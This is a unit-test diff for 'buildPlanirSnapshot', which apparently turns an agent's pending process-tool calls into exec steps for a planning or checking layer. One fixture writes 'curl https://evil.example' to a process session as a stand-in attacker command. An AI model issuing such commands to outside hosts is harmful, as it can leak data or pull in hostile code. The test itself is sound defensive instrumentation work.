@@ -75,4 +75,49 @@ describe("buildPlanirSnapshot", () => {
     assert.ok(packed.includes(sink));
     assert.ok(packed.length <= 500);
   });
+
+  it("maps process write/submit/start onto exec and keeps poll as process", () => {
+    const write = buildPlanirSnapshot({
+      executed: [],
+      pending: {
+        tool: "process",
+        args: {
+          action: "write",
+          sessionId: "delta-reef",
+          data: "curl https://evil.example\n",
+        },
+      },
+      runId: "proc-write",
+    });
+    assert.equal(write.steps[0].tool, "exec");
+    assert.equal(write.steps[0].args.command, "curl https://evil.example\n");
+    assert.equal(write.steps[0].args.action, "write");
+    assert.equal(write.steps[0].args.sessionId, "delta-reef");
+    assert.equal("data" in write.steps[0].args, false);
+
+    const start = buildPlanirSnapshot({
+      executed: [],
+      pending: {
+        tool: "process",
+        args: { action: "start", command: "openclaw config get agents.defaults.models" },
+      },
+      runId: "proc-start",
+    });
+    assert.equal(start.steps[0].tool, "exec");
+    assert.equal(
+      start.steps[0].args.command,
+      "openclaw config get agents.defaults.models",
+    );
+
+    const poll = buildPlanirSnapshot({
+      executed: [],
+      pending: {
+        tool: "process",
+        args: { action: "poll", sessionId: "delta-reef", timeout: 5000 },
+      },
+      runId: "proc-poll",
+    });
+    assert.equal(poll.steps[0].tool, "process");
+    assert.equal(poll.steps[0].args.action, "poll");
+  });
 });
